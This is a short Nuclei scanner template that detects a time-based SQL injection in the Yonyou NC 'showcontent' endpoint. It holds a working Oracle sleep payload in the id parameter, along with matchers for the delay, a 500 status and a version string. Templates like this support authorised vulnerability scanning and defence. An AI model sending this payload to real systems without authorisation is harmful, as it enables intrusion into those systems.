id: yonyou-nc-showcontent-sqli

info:
  name: "用友 NC showcontent SQL 注入漏洞"
  author: qwtd
  severity: high
  tags: 用友 NC

http:
  - raw:
    - |
      @timeout: 15s
      GET /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
      Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 500'
          - 'contains(body, "@VERSION@")'
        condition: and